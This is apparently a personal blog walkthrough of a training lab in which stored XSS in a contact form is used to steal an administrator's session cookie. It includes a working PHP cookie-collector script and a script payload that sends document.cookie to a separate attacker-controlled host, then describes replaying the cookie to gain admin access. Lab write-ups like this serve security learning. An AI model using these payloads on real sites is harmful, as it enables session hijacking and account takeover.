---
layout: default
title : muzec - Exploiting Cross-site Scripting To Steal Cookies 
---


### Description

In this lab you can practice XSS attacks against a web application hosted at the address 192.168.99.10. Since the application allows registered users to add comments, we have already created an account on the application. The credentials of this account are:

We have our create credentials already;

```
 Username: attacker
 Password: attacker
```

Let assume we have created and webpage which is own by the attacker we can use it to receive stolen cookies! You can find it at http://192.168.99.11/get.php : it takes all parameters passed via GET and stores them into the jar.txt file.

Backend get.php code;

```
<?php
$cookie=$_GET["cookie"];
$steal=fopen("jar.txt","a");
fwrite($steal,$cookie."\n");
fclose($steal);
?>
```

### Our Goals

The administrator visits the application every few minutes. The final goal of the lab is to steal the administrator cookies via XSS. Once you have these cookies you should be able to access the content of the page admin.php.

### Tools

Best tools is our brain yes i repeat our brain also we need a web browser lol.

### Engaging Target


![image](https://user-images.githubusercontent.com/69868171/139687734-a31c3b54-e15d-4284-b5f5-731da9506d8c.png)

Now let log in with our created credentials.

![image](https://user-images.githubusercontent.com/69868171/139687893-b4058404-efec-4418-b563-b85521c2864c.png)

We are in looking around we have a search form also a blog when we can comment and a contact page to to contact the administrator of the blog first thing first let try the search form with a simple XSS payload.

```
<script>alert("XSS");</script>
```

![image](https://user-images.githubusercontent.com/69868171/139688668-614ee990-4cfe-42b9-ba59-5fd0d6014e9c.png)

Boom a pop up we now know the search form is vulnerbale to XSS but need a form that can store our payload let the the blog page with the comment form.

![image](https://user-images.githubusercontent.com/69868171/139689067-896433e5-29ad-43dc-9826-e345acfac6cb.png)

I try injecting the XSS payload but seems the form is not vulnerable.

![image](https://user-images.githubusercontent.com/69868171/139689241-9f71ebf1-6d64-45ee-b796-25d0dd9f4124.png)

Now let move to the contact page to try our luck.

![image](https://user-images.githubusercontent.com/69868171/139689429-9ffb1ef8-2bdb-47bd-8e1a-c46636c85fa2.png)

We can see it store customer feedbacks cool now let injecting our XSS payload to grab the admin cookie between i already test it with the simple XSS payload that pop up so we know it vulnerable to XSS already.

![image](https://user-images.githubusercontent.com/69868171/139689795-47a2bb5c-016e-42dd-ba7e-6074e0e945e3.png)

```
<script> var i = new Image(); i.src="http://192.168.99.11/get.php?cookie="+escape(document.cookie)</script>
```

Now let submit it and our attacker site to recieve cookie is set already.

![image](https://user-images.githubusercontent.com/69868171/139690140-224c7151-f0c3-435a-8b8f-6a94aaa8ec47.png)

NOTE:- we know the administrator visits the application every few minutes. so anytime he visit the contact page we should able to get is session cookie on the jar.txt.

![image](https://user-images.githubusercontent.com/69868171/139690902-4832421e-66d0-4eae-80e7-dbdbf9b19e97.png)

To confirm our payload i visit the contact page and i got my cookie when checking the `jar.txt` hosted by us (attacker) .


![image](https://user-images.githubusercontent.com/69868171/139691184-13a6a68a-5046-4ee9-b567-4e5c90cb8503.png)

Boom and we finally got the admin session cookie now let edit our cookie to the admin cookie.

![image](https://user-images.githubusercontent.com/69868171/139691396-46125aae-2d5b-4e13-ad29-b83684eca26a.png)

We are admin hahahahaha cool right??

![image](https://user-images.githubusercontent.com/69868171/139691516-8671551c-7b78-4fb9-9911-d212fd0b471e.png)


Hope you learn one or two from my article.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
